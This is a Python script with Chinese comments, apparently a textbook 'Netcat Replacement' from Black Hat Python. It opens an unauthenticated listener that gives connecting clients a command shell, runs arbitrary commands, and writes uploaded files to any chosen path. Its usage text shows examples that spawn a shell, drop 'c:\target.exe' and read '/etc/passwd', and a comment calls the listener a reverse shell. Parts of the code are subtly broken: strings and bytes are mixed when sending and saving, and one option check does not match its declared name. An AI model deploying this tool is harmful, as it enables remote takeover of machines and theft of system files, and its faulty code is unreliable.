import sys
import socket
import getopt
import threading
import subprocess

# 定义全局变量
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


# 执行命令并返回输出
def run_command(cmd):

    # 删除字符串末尾的空格 
    cmd = cmd.rstrip()

    # 执行命令并返回输出
    try:
        output = subprocess.check_output(cmd,stderr=subprocess.STDOUT,
                                         shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    # 向客户端返回输出结果
    return output


# 接收客户端的连接
def client_handler(client_socket):
    global upload
    global execute
    global command

    # 检查上传文件
    if len(upload_destination):
        
        # 读取所有字符并写下目标
        # 初始化缓冲区
        file_buffer = ""

        # 持续读取数据直到没有符合的数据
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer.encode('utf-8'))
            file_descriptor.close()

            client_socket.send(
                "文件已保存到%s\r\n" % upload_destination
            )
        except OSError:
            client_socket.send(
                "保存文件至%s失败\r\n" % upload_destination
            )

    # 检查命令执行 
    if len(execute):
        
        # 执行命令
        output = run_command(execute)

        client_socket.send(output)

    # 如果需要一个命令行shell,那么我们进入另一个循环
    if command:

        while True:
            # 显示提示符
            client_socket.send("<BHP:#>".encode('utf-8'))
            
            # 接收到换行符后再执行命令
            cmd_buffer = b''
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            response = run_command(cmd_buffer)
            
            # 返回响应结果
            client_socket.send(response)
            

def server_loop():
    global target
    global port

    # 如果未定义目标地址，则监听所有网络接口
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while  True:
        client_socket, addr = server.accept()

        # 创建一个线程来处理新的客户端
        client_thread = threading.Thread(target=client_handler,
                                        args=(client_socket,))
        client_thread.start()


# 实现客户端的功能
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 连接目标主机
        client.connect((target,port))

        # 检测到来自目标的标准输入，则发送它
        # 否则继续等待输入
        if len(buffer):
            client.send(buffer.encode('utf-8'))

            while True:
                # 等待返回数据
                recv_len = 1
                responses = b''
                
                # 接收返回的数据
                while recv_len:
                    data = client.recv(4096)
                    recv_len = len(data)
                    responses += data

                    if recv_len < 4096:
                        break

                print(responses.decode('utf-8'), end=' ')

                # 继续等待输入
                buffer = input("")
                buffer += "\n"

                # 发送数据
                client.send(buffer.encode('utf-8'))

    # 异常处理
    except socket.error as exc:
        print("[*]异常退出!")
        print(f"[*]捕获异常连接错误: {exc}")
        
        # 关闭连接
        client.close()

def usage():
    print("Netcat Replacement")
    print()
    print("使用方法: netcat.py -t target_host -p port")
    print("-l --listen                              - 开启一个监听端口")
    print("-e --execute=file_to_run                 - 建立连接后执行指定的命令")
    print("-c --command                             - 初始化一个命令行窗口")
    print("-u --upload=destination                  - 建立连接和上传文件到指定路径")
    print()
    print()
    print("使用示例: ")
    print("netcat.py -t 192.168.0.1 -p 5555 -l -c")
    print("netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("netcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./netcat.py -t 192.168.11.12 -p 135")
    sys.exit()


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target",
                                    "port", "command", "upload"])
        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
            elif o in ("-l", "--listen"):
                listen = True
            elif o in ("-e", "--execute"):
                execute = a
            elif o in ("-c", "--commandshell"):
                command = True
            elif o in ("-u", "--upload"):
                upload_destination = a
            elif o in ("-t", "--target"):
                target = a
            elif o in ("-p", "--port"):
                port = int(a)
            else:
                assert False, "Unhandled Option"

    except getopt.GetoptError as err:
        print(str(err))
        usage()

    # 我们是进行监听还是仅从标准输入读取数据并发送数据？ 
    if not listen and len(target) and port > 0:

        
        # 从命令行读取内存数据  
        # 这里将阻塞,所以不再向标准输入发送数据时发送CTRL-D 
        buffer = sys.stdin.read()
        # 发送数据
        client_sender(buffer)
        
    # 我们开始监听并准备上传文件,执行命令  
    # 放置一个反弹shell  
    # 取决于上面的命令行选项
    if listen:
        server_loop()

main()